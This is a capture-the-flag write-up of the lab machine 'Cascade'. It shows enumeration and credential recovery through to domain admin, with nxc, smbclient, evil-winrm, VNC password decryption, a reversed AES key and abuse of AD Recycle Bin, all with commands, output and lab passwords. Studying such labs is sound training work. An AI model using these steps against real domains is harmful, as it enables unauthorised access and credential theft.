# Cascade - OSCP Boxe

Owner: Leandre Brl

![Untitled](Cascade%20-%20OSCP%20Boxe%2009ffdd7ca57b41c1a0dfc99f8b39d973/Untitled.png)

## **Scanning :**

Run my inital scan to see open ports and services. 

```sql
> nmap -sV -sC -Pn -sS -T4 10.10.10.182

# OUTPUT
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-06 15:27:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-06T15:28:47
|_  start_date: 2024-08-06T15:26:19
|_clock-skew: 1m00s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.26 seconds
```

Run full ports scan. 

```sql
> nmap -p- --max-retries 1 -n -Pn -T5 10.10.10.182

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49170/tcp open  unknown
```

lets add domaine and the FQDN to my /etc/hosts file.

```sql
> echo "10.10.10.182 cascade.local CASC-DC1.cascade.local" >> /etc/hosts
```

## **Enumerate SMB with Null session :**

I can connect with null session on smb service. 

```sql
> nxc smb 10.10.10.182 -u '' -p ''
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\: 
```

lets enumerate the user with nxc using `users` flag. 

```sql
> nxc smb 10.10.10.182 -u '' -p '' --users 
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\: 
SMB         10.10.10.182    445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.10.182    445    CASC-DC1         CascGuest                     <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.10.182    445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0        
SMB         10.10.10.182    445    CASC-DC1         s.smith                       2020-01-28 19:58:05 0        
SMB         10.10.10.182    445    CASC-DC1         r.thompson                    2020-01-09 19:31:26 0        
SMB         10.10.10.182    445    CASC-DC1         util                          2020-01-13 02:07:11 0        
SMB         10.10.10.182    445    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 0        
SMB         10.10.10.182    445    CASC-DC1         s.hickson                     2020-01-13 01:24:27 0        
SMB         10.10.10.182    445    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 0        
SMB         10.10.10.182    445    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 0        
SMB         10.10.10.182    445    CASC-DC1         e.crowe                       2020-01-13 03:45:02 0        
SMB         10.10.10.182    445    CASC-DC1         b.hanson                      2020-01-13 16:35:39 0        
SMB         10.10.10.182    445    CASC-DC1         d.burman                      2020-01-13 16:36:12 0        
SMB         10.10.10.182    445    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 0        
SMB         10.10.10.182    445    CASC-DC1         j.allen                       2020-01-13 17:23:59 0        
SMB         10.10.10.182    445    CASC-DC1         i.croft                       2020-01-15 21:46:21 0 

# GET ONLY THE USERS
> awk '{print $5}' user.txt 
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

## **LDAP Null bind :**

Using nxc i can see i connect on LDAP using null bind. 

```sql
> nxc ldap 10.10.10.182 -u '' -p ''
```

lets try to enumerate all the user find thanks to ldap query. to do so I made a little bash script that execute the nxc command to use my list. 

```sql
#!/bin/bash

USER_LIST="users.lst"
while IFS= read -r user; do
    nxc ldap 10.10.10.182 -u "" -p "" --query "(sAMAccountName=$user)" ""
done < "$USER_LIST"

# RUN THE SCRIPT
> chmod +x script.sh && ./script.sh
```

in one of the output I find an LDAP attribute unusual enough to use **`r.thompson`**

```sql
LDAP        10.10.10.182    389    CASC-DC1         [+] Response for object: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
LDAP        10.10.10.182    389    CASC-DC1         objectClass:         top person organizationalPerson user
LDAP        10.10.10.182    389    CASC-DC1         cn:                  Ryan Thompson
LDAP        10.10.10.182    389    CASC-DC1         sn:                  Thompson
LDAP        10.10.10.182    389    CASC-DC1         givenName:           Ryan
LDAP        10.10.10.182    389    CASC-DC1         distinguishedName:   CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
LDAP        10.10.10.182    389    CASC-DC1         instanceType:        4
LDAP        10.10.10.182    389    CASC-DC1         whenCreated:         20200109193126.0Z
LDAP        10.10.10.182    389    CASC-DC1         whenChanged:         20200323112031.0Z
LDAP        10.10.10.182    389    CASC-DC1         displayName:         Ryan Thompson
LDAP        10.10.10.182    389    CASC-DC1         uSNCreated:          24610
LDAP        10.10.10.182    389    CASC-DC1         memberOf:            CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
LDAP        10.10.10.182    389    CASC-DC1         uSNChanged:          295010
LDAP        10.10.10.182    389    CASC-DC1         name:                Ryan Thompson
LDAP        10.10.10.182    389    CASC-DC1         objectGUID:          0x2dfa43eaa9e0524ba9132f5b1570418c
LDAP        10.10.10.182    389    CASC-DC1         userAccountControl:  66048
LDAP        10.10.10.182    389    CASC-DC1         badPwdCount:         14
LDAP        10.10.10.182    389    CASC-DC1         codePage:            0
LDAP        10.10.10.182    389    CASC-DC1         countryCode:         0
LDAP        10.10.10.182    389    CASC-DC1         badPasswordTime:     133674344266797596
LDAP        10.10.10.182    389    CASC-DC1         lastLogoff:          0
LDAP        10.10.10.182    389    CASC-DC1         lastLogon:           132247339125713230
LDAP        10.10.10.182    389    CASC-DC1         pwdLastSet:          132230718862636251
LDAP        10.10.10.182    389    CASC-DC1         primaryGroupID:      513
LDAP        10.10.10.182    389    CASC-DC1         objectSid:           0x01050000000000051500000032fba1c60b1df147f5c8724555040000
LDAP        10.10.10.182    389    CASC-DC1         accountExpires:      9223372036854775807
LDAP        10.10.10.182    389    CASC-DC1         logonCount:          2
LDAP        10.10.10.182    389    CASC-DC1         sAMAccountName:      r.thompson
LDAP        10.10.10.182    389    CASC-DC1         sAMAccountType:      805306368
LDAP        10.10.10.182    389    CASC-DC1         userPrincipalName:   r.thompson@cascade.local
LDAP        10.10.10.182    389    CASC-DC1         objectCategory:      CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
LDAP        10.10.10.182    389    CASC-DC1         dSCorePropagationData: 20200126183918.0Z 20200119174753.0Z 20200119174719.0Z 20200119174508.0Z 16010101000000.0Z
LDAP        10.10.10.182    389    CASC-DC1         lastLogonTimestamp:  132294360317419816
LDAP        10.10.10.182    389    CASC-DC1         msDS-SupportedEncryptionTypes: 0
LDAP        10.10.10.182    389    CASC-DC1         cascadeLegacyPwd:    clk0bjVldmE=
```

this attribute contains a data encoded in b64 we can decode it to find the initial given

```sql
> echo "clk0bjVldmE=" | base64 -d               
rY4n5eva
```

Thanks to that we have our first access to the domain. 

```sql
nxc smb 10.10.10.182 -u 'r.thompson' -p rY4n5eva       
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
```

## **Back To SMB :**

lets enumerate the smb share

```sql
> smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182 -d cascade.local
                                                                                                    
[+] IP: 10.10.10.182:445        Name: cascade.local             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
```

When we have a lot of sharing to list we can use a module of nxc called spider_plus that will find all the files to which we accessed dand all the shares accessible from the smb service

```sql
> nxc smb 10.10.10.182 -u 'r.thompson' -p rY4n5eva -M spider_plus  

SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.10.182.json".
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] SMB Shares:           8 (ADMIN$, Audit$, C$, Data, IPC$, NETLOGON, print$, SYSVOL)
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] SMB Readable Shares:  4 (Data, NETLOGON, print$, SYSVOL)
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] Total folders found:  58
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] Total files found:    20
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] File size average:    1.07 KB
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] File size min:        6 B
SPIDER_PLUS 10.10.10.182    445    CASC-DC1         [*] File size max:        5.83 KB
```

I connect on network share named Data and collect all the content. 

```sql
> smbclient //10.10.10.182/data -U 'cascade.local/r.thompson%rY4n5eva'

smb: \> recurse on
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (29.0 KiloBytes/sec) (average 29.0 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (13.8 KiloBytes/sec) (average 21.1 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (70.2 KiloBytes/sec) (average 36.8 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (30.1 KiloBytes/sec) (average 35.1 KiloBytes/sec)
```

Among all these files I take note of a user named TempAdmin, this users, which would have been deleted by Arksvc seems to have administrator rights, moreover in the Email Archives note it is said that he has the same password as an Administrator account, interresting…

```sql
> cat /IT/Logs/"Ark AD Recycle Bin"/ArkAdRecycleBin.log

1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
```

If you pay more attention to the ArkSvc user I can see that it is part of the `AD Recycle Bin` group. members of this group are allows for the reading of deleted Active Directory objects. 

```sql
> nxc ldap 10.10.10.182 -u r.thompson -p rY4n5eva --query "(sAMAccountName=ArkSvc)" "memberOf" 

LDAP        10.10.10.182    389    CASC-DC1         memberOf:            CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
```

But before that I still have to search in the files that I recovered in the share, I find a file named `VNC Install.reg` and in this file it finds a value in hexa in a variable named **`Password`**.

```sql
> cat "VNC Install.reg"

---
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
---
```

I’m looking for how to rip this data and I come across this article on the internet.

[Comment déchiffrer les mots de passe VNC](https://blog.pascal-mietlicki.fr/comment-dechiffrer-les-mots-de-passe-vnc/)

To find the data in clear just do the linux command given in the blog.

```sql
> echo -n <HEXA_VALUE> | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008
```

It would seem that we have found `s.smith` password, we can valid the credential with nxc.

```sql
> nxc ldap 10.10.10.182 -u s.smith -p sT333ve2 -M whoami
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
LDAP        10.10.10.182    389    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 
WHOAMI      10.10.10.182    389    CASC-DC1         distinguishedName: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
WHOAMI      10.10.10.182    389    CASC-DC1         Member of: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local
WHOAMI      10.10.10.182    389    CASC-DC1         Member of: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
WHOAMI      10.10.10.182    389    CASC-DC1         Member of: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
WHOAMI      10.10.10.182    389    CASC-DC1         name: Steve Smith
WHOAMI      10.10.10.182    389    CASC-DC1         Enabled: Yes
WHOAMI      10.10.10.182    389    CASC-DC1         Password Never Expires: Yes
WHOAMI      10.10.10.182    389    CASC-DC1         Last logon: 132247275990842339
WHOAMI      10.10.10.182    389    CASC-DC1         pwdLastSet: 132247150854857364
WHOAMI      10.10.10.182    389    CASC-DC1         logonCount: 16
WHOAMI      10.10.10.182    389    CASC-DC1         sAMAccountName: s.smith
```

This user is part of groupe `Remote Management Users` that meen we can open Powershell session with winrm. 

```sql
> evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
```

## **Windows Binary reversing :**

with this new user i can connect on the network share named `Audit$` lets open the shell with smblcient. 

```sql
> smbclient //10.10.10.182/Audit$ -U 'cascade.local/s.smith%sT333ve2'
```

Download all the content, In everything we have recover there is a program windows, this program is `CascAudit`, there are also quite a few librairi file .dll that accompanies it.

Well I’m not really strong in reverse so I used a tool that will do everything for me this tool is called [**`DnsPy`**](https://github.com/dnSpy/dnSpy/releases/tag/v6.1.8)

thanks to DnSpy I can find pieces of code of the program that are interesting.

CascAudit.exe :

```c
public static void Main()
{
	if (MyProject.Application.CommandLineArgs.Count != 1)
	{
		Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
		return;
	}
	checked
	{
		using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
		{
			string str = string.Empty;
			string password = string.Empty;
			string str2 = string.Empty;
			try
			{
				sqliteConnection.Open();
				using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
				{
					using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
					{
						sqliteDataReader.Read();
						str = Conversions.ToString(sqliteDataReader["Uname"]);
						str2 = Conversions.ToString(sqliteDataReader["Domain"]);
						string encryptedString = Conversions.ToString(sqliteDataReader["Pwd"]);
						try
						{
							password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
						}
						catch (Exception ex)
						{
							Console.WriteLine("Error decrypting password: " + ex.Message);
							return;
						}
					}
				}
				sqliteConnection.Close();
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Error getting LDAP connection data From database: " + ex2.Message);
				return;
			}
			int num = 0;
			using (DirectoryEntry directoryEntry = new DirectoryEntry())
			{
				directoryEntry.Username = str2 + "\\" + str;
				directoryEntry.Password = password;
				directoryEntry.AuthenticationType = AuthenticationTypes.Secure;
				using (DirectorySearcher directorySearcher = new DirectorySearcher(directoryEntry))
				{
					directorySearcher.Tombstone = true;
					directorySearcher.PageSize = 1000;
					directorySearcher.Filter = "(&(isDeleted=TRUE)(objectclass=user))";
					directorySearcher.PropertiesToLoad.AddRange(new string[]
					{
						"cn",
						"sAMAccountName",
						"distinguishedName"
					});
					using (SearchResultCollection searchResultCollection = directorySearcher.FindAll())
					{
						Console.WriteLine("Found " + Conversions.ToString(searchResultCollection.Count) + " results from LDAP query");
						sqliteConnection.Open();
						try
						{
							try
							{
								foreach (object obj in searchResultCollection)
								{
									SearchResult searchResult = (SearchResult)obj;
									string text = string.Empty;
									string text2 = string.Empty;
									string text3 = string.Empty;
									if (searchResult.Properties.Contains("cn"))
									{
										text = Conversions.ToString(searchResult.Properties["cn"][0]);
									}
									if (searchResult.Properties.Contains("sAMAccountName"))
									{
										text2 = Conversions.ToString(searchResult.Properties["sAMAccountName"][0]);
									}
									if (searchResult.Properties.Contains("distinguishedName"))
									{
										text3 = Conversions.ToString(searchResult.Properties["distinguishedName"][0]);
									}
									using (SQLiteCommand sqliteCommand2 = new SQLiteCommand("INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)", sqliteConnection))
									{
										sqliteCommand2.Parameters.AddWithValue("@Name", text);
										sqliteCommand2.Parameters.AddWithValue("@Username", text2);
										sqliteCommand2.Parameters.AddWithValue("@Dn", text3);
										num += sqliteCommand2.ExecuteNonQuery();
									}
								}
							}
							finally
							{
								IEnumerator enumerator;
								if (enumerator is IDisposable)
								{
									(enumerator as IDisposable).Dispose();
								}
							}
						}
						finally
						{
							sqliteConnection.Close();
							Console.WriteLine("Successfully inserted " + Conversions.ToString(num) + " row(s) into database");
						}
					}
				}
			}
		}
	}
}
```

CascCrypto.dll Fonction `DecryptString`: 

```c
public static string DecryptString(string EncryptedString, string Key)
{
	byte[] array = Convert.FromBase64String(EncryptedString);
	Aes aes = Aes.Create();
	aes.KeySize = 128;
	aes.BlockSize = 128;
	aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
	aes.Mode = CipherMode.CBC;
	aes.Key = Encoding.UTF8.GetBytes(Key);
	string @string;
	using (MemoryStream memoryStream = new MemoryStream(array))
	{
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
		{
			byte[] array2 = new byte[checked(array.Length - 1 + 1)];
			cryptoStream.Read(array2, 0, array2.Length);
			@string = Encoding.UTF8.GetString(array2);
		}
	}
	return @string;
}
```

Roughly this code is quite interesting because it contains a lot of interesting information including the encryption recipe for the password in a database related to the program. I look in the other file download and I come across a given db file, lets dump the entire content. 

```c
> sqlite3 Audit.db

# DUMP ENTIRE DB
sqlite> .dump

PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Ldap" (
 "Id" INTEGER PRIMARY KEY AUTOINCREMENT,
 "uname" TEXT,
 "pwd" TEXT,
 "domain" TEXT
);
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
CREATE TABLE IF NOT EXISTS "Misc" (
 "Id" INTEGER PRIMARY KEY AUTOINCREMENT,
 "Ext1" TEXT,
 "Ext2" TEXT
);
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
 "Id" INTEGER PRIMARY KEY AUTOINCREMENT,
 "Username" TEXT,
 "Name" TEXT,
 "DistinguishedName" TEXT
);
INSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\n',char(10)),'CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\n',char(10)),'CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\n',char(10)),'CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('Ldap',2);
INSERT INTO sqlite_sequence VALUES('DeletedUserAudit',10);
COMMIT;
```

I find the value of the variable `pwd` that we also find in the code of CascAudit.exe, with all this information I can decrypt the data. I tried to do in python but for a reason I don’t know that I can not do so I went on the site [https://www.devglan.com/online-tools/aes-encryption-decryption](https://www.devglan.com/online-tools/aes-encryption-decryption) to do that.

![Untitled](Cascade%20-%20OSCP%20Boxe%2009ffdd7ca57b41c1a0dfc99f8b39d973/Untitled%201.png)

try the password we found with the ArkSvc user

```bash
> nxc smb 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd                                                                                          
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\ArkSvc:w3lc0meFr31nd 
```

## **Abuse AD Recyble Bin SecuGroup :**

As we know ArkSvc is a member of the group Remote Management Users so I can log in powershell with winrm. 

```bash
> evil-winrm -u ArkSvc -p w3lc0meFr31nd -i 10.10.10.182
```

Now I can abuse the AS Recycle Bin group to dump information about objects deleted from the AD, especially the TempAdmin user.

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * |

# TempAdmin PART
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

The **`cascadeLegacyPwd`** attribute that we found in the beginning of the machine is again here on this Users. we can decode the data as before.

```bash
> echo YmFDVDNyMWFOMDBkbGVz | base64 -d                                 
baCT3r1aN00dles
```

In logic this password should be the same for the domain administrator. 

```bash
> nxc smb 10.10.10.182 -u Administrator -p baCT3r1aN00dles                                    
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)
```

Lets We Are DA Now ! 🤩

## **Ressources :**

LDAP Query with nxc : [https://www.netexec.wiki/ldap-protocol/query-ldap](https://www.netexec.wiki/ldap-protocol/query-ldap)

Decrypt VNC Password : https://blog.pascal-mietlicki.fr/comment-dechiffrer-les-mots-de-passe-vnc/

Abuse AD Recyble Bin Group : [https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#deleted-objects](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#deleted-objects)